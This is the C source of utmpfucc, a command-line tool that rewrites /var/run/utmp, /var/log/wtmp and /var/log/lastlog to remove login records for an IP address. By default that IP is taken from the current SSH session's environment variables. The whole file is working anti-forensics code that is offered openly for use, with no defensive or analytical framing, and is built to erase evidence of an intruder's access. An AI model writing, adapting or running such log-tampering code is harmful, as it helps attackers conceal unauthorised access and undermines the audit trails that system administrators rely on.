#include "utmpfucc.h"


/*
 *   compare_record()
 *   ~~~~~~~~~~~~~~~~
 *   
 *   compares a utmp record's ip with the one to remove
 */
bool compare_record(utmp *r)
{
	return (target != 0 && target == r->ut_addr);
}


/*
 *   divine_ip_from_environ()
 *   ~~~~~~~~~~~~~~~~~~~~~~~~
 *   
 *   try and get the ip address to remove from the environment. first try the
 *   environment variable SSH_CLIENT, then SSH_CONNECTION, else return null.
 */
char *divine_ip_from_environ(void)
{
	char *ip, *env = getenv("SSH_CLIENT");

	if (env == NULL) {
		env = getenv("SSH_CONNECTION");
		if (env == NULL) {
			_1("could not find ip in environment");
			return NULL;
		}
	}

	ip = strtok(env, " ");

	assert(ip != NULL);

	_2("got ip='%s' from environment", ip);
	return ip;
}


/*
 *   do_utmp_file()
 *   ~~~~~~~~~~~~~~
 *   
 *   read, censor and rewrite a utmp file
 *
 *   utmp structure
 *   --------------
 *   utmp is a collection of struct utmp's all placed one after the other. to
 *   remove a record, we are just going through the entire utmp file, a record
 *   at a time, and omitting the records we don't want.
 */
void do_utmp_file(char *filename)
{
	size_t r_size = 0;
	int lines = 0;
	int removed = 0;
	char buf[sizeof(utmp)];

	_2("processing '%s' as utmp file", filename);

	FILE *file = fopen(filename, "r");
	FILE *tmp = tmpfile();

	if (file == NULL)
		die(filename);
	if (tmp == NULL)
		die("could not open temp file");

	// read log file, compare records to see if they need to disappear,
	// write to temp file
	while ((r_size = fread(buf, 1, sizeof(utmp), file)) > 0)
	{
		lines++;

		utmp *r = (utmp *)buf;
		bool match = compare_record(r);

		if (match) {
			// the current utmp record needed to be censored so we do nothing
			removed++;
		}
		else {
			fwrite(buf, 1, r_size, tmp);
		}

		if (match || verbose) {
			if (match) printf("\033[38;5;196m");
			printf("%s: ", filename);
			print_record(r);
			if (match) printf("\033[m");
		}
	}

	_("%s: %s %d records",
		filename, dry_run? "would have removed" : "removed", removed);

	// write the edited temporary file to the log
	if (! dry_run)
	{
		lines = 0;
		freopen(filename, "w", file);
		rewind(tmp);

		while ((r_size = fread(buf, 1, sizeof(utmp), tmp)) > 0) {
			fwrite(buf, 1, r_size, file);
			lines++;
		}
	}

	fclose(file);
	fclose(tmp);
}


/*
 *   do_llog_file()
 *   ~~~~~~~~~~~~
 *   
 *   read, censor and rewrite a lastlog
 *   yes this basically a copy and paste of above. i'm too lazy to care.
 *
 *   lastlog structure
 *   -----------------
 *   there is a line for every uid, from the first to the last. even for users
 *   that don't exist. so if you have the uid's 0, 1, 2, and 10000 on your
 *   system, you would have about 10000 records, most of them containing
 *   nothing.
 *   so instead of leaving records out like utmp, we have to zero the records
 *   out.
 */
void do_llog_file(char *filename)
{
	size_t r_size = 0;
	int lines = 0;
	int removed = 0;
	char buf[sizeof(lastlog)];
	struct lastlog *ptr = (struct lastlog *)buf;
	char *ip;

	_2("processing '%s' as lastlog file", filename);

	FILE *file = fopen(filename, "r");
	FILE *tmp = tmpfile();

	if (file == NULL)
		die(filename);
	if (tmp == NULL)
		die("could not open temp file");

	// we made target into an in_addr_t for utmp, let's change it back
	ip = ip_to_string(&target);


	while ((r_size = fread(buf, 1, sizeof(buf), file)) > 0)
	{
		// if (! strcmp( ((lastlog *)buf)->ll_host, ip )) {

		if (! strcmp(ptr->ll_host, ip)) {
			_1("%s: removing lastlog record for uid=%d", filename, lines);
			memset(buf, 0, sizeof(buf));
			removed++;
		}
		else {
			// _2("%s: at %d: record %d seems ok", filename, ftell(file), lines);
		}
		fwrite(buf, 1, r_size, tmp);
		lines++;
	}

	_("%s: %s %d records",
		filename, dry_run? "would have removed" : "removed", removed);

	if (! dry_run)
	{
		lines = 0;
		freopen(filename, "w", file);
		rewind(tmp);

		while ((r_size = fread(buf, 1, sizeof(buf), tmp)) > 0) {
			fwrite(buf, 1, r_size, file);
			lines++;
		}
	}

	fclose(file);
	fclose(tmp);
}


/*
 *   set_option_defaults()
 *   ~~~~~~~~~~~~~~~~~~~~~
 *   
 *   ld got the shits with me when i had like `int this = 0;` in the utmpfucc.h
 *   file, so i just defined them there, and this function gives them values, 
 *   in an attempt to prevent undefined behaviour.
 *
 *   must be run before getopt
 */
void set_option_defaults(void)
{
	verbose     = false;
	dry_run     = false;
	divine_ip   = true;
	custom_file = false;
	skip_utmp   = false;
	skip_wtmp   = false;
	skip_llog   = false;
}


/*
 *   do_getopts()
 *   ~~~~~~~~~~~~
 *   
 *   do getopts
 */
void do_getopts(int argc, char **argv)
{
	while (1 + 1 == 2)
	{
		int c;
		char *shortopts = "i:hvVnf:";

		struct option longopts[] = {
			{ "ip",           required_argument, 0,          'i'},
			{ "help",         no_argument,       0,          'h'},
			{ "version",      no_argument,       0,          'V'},
			{ "dry-run",      required_argument, 0,          'n'},
			{ "file",         required_argument, 0,          'f'},
			{ "skip-utmp",    no_argument,       &skip_utmp,  1 },
			{ "skip-wtmp",    no_argument,       &skip_wtmp,  1 },
			{ "skip-lastlog", no_argument,       &skip_llog,  1 },
			{ NULL,           0,                 0,           0 }
		};

		int index = 0;

		c = getopt_long(argc, argv, shortopts, longopts, &index);

		if (c < 0)
			break;

		switch (c)
		{
			case 0:
				_2("'--%s' set via longopts", longopts[index].name);
				break;

			case 'h': usage();
			case 'V': version();
			case 'v':
				verbose++;
				_2("verbose level %d enabled", verbose);
				break;

			case 'i':
				divine_ip = false;
				target = string_to_ip(optarg);
				_2("target ip: 0x%08x", target);
				break;

			case 'n':
				dry_run = true;
				_2("dry run enabled");
				break;

			case 'f':
				custom_file = true;
				custom_file_path = strdup(optarg);
				_2("file: %s", custom_file_path);
				break;
		}
	}
}


void usage()
{
	printf(
		"usage: %s [OPTION]...\n"
		"remove entries from utmp/wtmp logs"
		"\n"
		"   -i, --ip=IP         specify ip address to remove\n"
		"   -n, --dry-run       don't modify log files\n"
		"   -f, --file          utmp file to edit (default /var/run/utmp and\n"
		"                       /var/log/wtmp)\n"
		"       --skip-utmp     skip /var/run/utmp\n"
		"       --skip-wtmp     skip /var/log/wtmp\n"
		"       --skip-lastlog  skip /var/log/lastlog\n"
		"   -v, --verbose       control verbosity (can be given twice)\n"
		"   -h, --help          display this help and exit\n"
		"   -V, --version       output version information and exit\n"
		"\n", argv0);
	exit(0);
}


void version()
{
	printf("%s v%s copyright @reptar_xl, %s\n"
	       "<https://github.com/raincoats/utmpfucc>\n"
	       "\n"
	       "LICENSE: in order to use this software, you have to help an\n"
	       "elderly neighbour change a lightbulb, or mow the lawn, something\n"
	       "like that. after you're done, the MIT license applies.\n"
	       "\n",
	       argv0, PROG_VERSION, __DATE__
	);
	exit(0);
}


/*
 *    main()
 *    ~~~~~~
 *
 *    here we go lads
 */
int main(int argc, char **argv)
{
	argv0 = (argv[0] == NULL)? PROG_NAME : basename(argv[0]);

	set_option_defaults();
	do_getopts(argc, argv);

	if (divine_ip) {
		char *ip = divine_ip_from_environ();

		if (ip == NULL) {
			_w("could not get ip from environment. provide one with '-i'");
			return 1;
		}
		target = string_to_ip(ip);
	}

	if (custom_file) {
		do_utmp_file(custom_file_path);
		free(custom_file_path);
	}
	else {
		if (! skip_utmp)
			do_utmp_file("/var/run/utmp");
		if (! skip_wtmp)
			do_utmp_file("/var/log/wtmp");
		if (! skip_llog)
			do_llog_file("/var/log/lastlog");
	}

	return 0;
}


